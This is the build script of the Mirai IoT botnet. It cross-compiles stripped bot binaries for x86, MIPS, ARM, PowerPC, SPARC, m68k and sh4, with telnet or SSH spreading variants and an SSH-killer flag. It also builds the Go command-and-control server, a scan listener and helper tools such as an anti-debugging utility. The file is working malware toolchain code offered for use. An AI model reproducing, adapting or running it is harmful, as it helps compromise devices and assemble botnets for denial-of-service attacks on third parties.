#!/bin/bash

FLAGS=""

function compile_bot {
    "/etc/xcompile/$1/bin/$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "/etc/xcompile/$1/bin/$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

if [ $# == 2 ]; then
    if [ "$2" == "telnet" ]; then
        FLAGS="-DMIRAI_TELNET"
    elif [ "$2" == "ssh" ]; then
        FLAGS="-DMIRAI_SSH"
    fi
else
    echo "Missing build type." 
    echo "Usage: $0 <debug | release> <telnet | ssh>"
fi

if [ $# == 0 ]; then
    echo "Usage: $0 <debug | release> <telnet | ssh>"
elif [ "$1" == "release" ]; then
    rm release/mirai.*
    rm release/miraint.*
    go build -o release/cnc cnc/*.go
    compile_bot i586 mirai.x86 "$FLAGS -DKILLER_REBIND_SSH -static"
#    gcc -std=c99 $FLAGS -DKILLER_REBIND_SSH -static bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/mirai.exp -DMIRAI_BOT_ARCH="i586"
#    strip release/mirai.exp -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
#    gcc -std=c99 $FLAGS -DKILLER_REBIND_SSH -static bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/mirai.x86 -DMIRAI_BOT_ARCH="i586"
#    strip release/mirai.x86 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
    compile_bot mips mirai.mips "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot mipsel mirai.mpsl "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot armv4l mirai.arm "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot powerpc mirai.ppc "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot sparc mirai.spc "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot m68k mirai.m68k "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot sh4 mirai.sh4 "$FLAGS -DKILLER_REBIND_SSH -static"

    compile_bot i586 miraint.x86 "-static"
    compile_bot mips miraint.mips "-static"
    compile_bot mipsel miraint.mpsl "-static"
    compile_bot armv4l miraint.arm "-static"
    compile_bot powerpc miraint.ppc "-static"
    compile_bot sparc miraint.spc "-static"
    compile_bot m68k miraint.m68k "-static"
    compile_bot sh4 miraint.sh4 "-static"

    go build -o release/scanListen tools/scanListen.go
elif [ "$1" == "debug" ]; then
    gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
    /etc/xcompile/mips/bin/mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mips
    /etc/xcompile/armv4l/bin/armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm
    #armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm7
    /etc/xcompile/sh4/bin/sh4-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.sh4
    gcc -std=c99 tools/enc.c -g -o debug/enc
    gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
    gcc -std=c99 tools/badbot.c -g -o debug/badbot
    go build -o debug/cnc cnc/*.go
    go build -o debug/scanListen tools/scanListen.go
else
    echo "Unknown parameter $1: $0 <debug | release>"
fi

